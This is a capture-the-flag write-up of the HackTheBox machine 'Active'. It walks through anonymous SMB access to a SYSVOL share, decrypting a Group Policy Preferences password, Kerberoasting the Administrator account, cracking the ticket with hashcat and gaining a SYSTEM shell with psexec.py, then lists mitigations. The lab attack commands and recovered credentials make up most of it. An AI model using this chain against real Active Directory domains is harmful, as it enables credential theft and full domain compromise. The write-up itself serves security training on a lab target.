---
title: "Active — HackTheBox"
date: 2026-04-26
platform: "HackTheBox"
difficulty: "Easy"
category: "Active Directory"
tags: ["gpp-password", "kerberoasting", "smb", "active-directory", "windows"]
published: true
excerpt: "Active is a textbook AD box: an anonymously readable SYSVOL share leaks a GPP-encrypted service-account password, which is Kerberoasted into a full Domain Admin compromise. Two legacy misconfigurations, total takeover."
---

# Active — HackTheBox

**IP:** 10.10.10.100
**OS:** Windows Server (Domain: `active.htb`)
**Difficulty:** Easy

---

## Why This Box Matters

Active chains two of the most common real-world AD misconfigurations: a **Group Policy Preferences (GPP) password** stored in SYSVOL, and a **Kerberoastable Domain Admin**. Both still show up on live internal engagements years after Microsoft "fixed" them.

---

## Reconnaissance

```bash
nmap -sC -sV -p- 10.10.10.100

53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb)
445/tcp  open  microsoft-ds
```

Kerberos + LDAP + SMB = a domain controller for `active.htb`.

## SMB: Anonymous SYSVOL Access

```bash
smbclient -N -L //10.10.10.100/

Sharename       Type      Comment
Replication     Disk
Users           Disk
```

`Replication` is readable with a null session — it's an unauthenticated copy of SYSVOL.

```bash
smbclient -N //10.10.10.100/Replication
# recursively pull everything
mask ""; recurse ON; prompt OFF; mget *
```

Buried in the policies is a GPP file:

```
active.htb/Policies/{31B2F340-...}/MACHINE/Preferences/Groups/Groups.xml
```

## Decrypting the GPP Password

```xml
<Groups ...>
  <User ... name="active.htb\SVC_TGS"
    cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"/>
</Groups>
```

GPP `cpassword` values are AES-encrypted with a **static key Microsoft published in MSDN** — so they're trivially reversible:

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

Valid domain creds: `active.htb\SVC_TGS : GPPstillStandingStrong2k18`.

## Kerberoasting to Domain Admin

With any valid account you can request service tickets (TGS) for accounts that have an SPN — and the Administrator here does:

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 \
  -dc-ip 10.10.10.100 -request

ServicePrincipalName  Name           MemberOf
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS...
```

The TGS is encrypted with the service account's NTLM hash — crack it offline:

```bash
hashcat -m 13100 admin_tgs.hash /usr/share/wordlists/rockyou.txt
Ticketmaster1968
```

## Domain Admin

```bash
psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100

C:\> whoami
nt authority\system
```

---

## Root Cause & Mitigation

- **GPP passwords:** patch MS14-025 and delete legacy `Groups.xml`/`Services.xml` from SYSVOL — the fix stops new ones but does **not** remove existing files.
- **Kerberoasting:** use `gMSA`/long random passwords (25+ chars) for service accounts, and never leave a privileged account with an SPN. Alert on TGS requests using RC4 (`4769`, encryption type `0x17`).
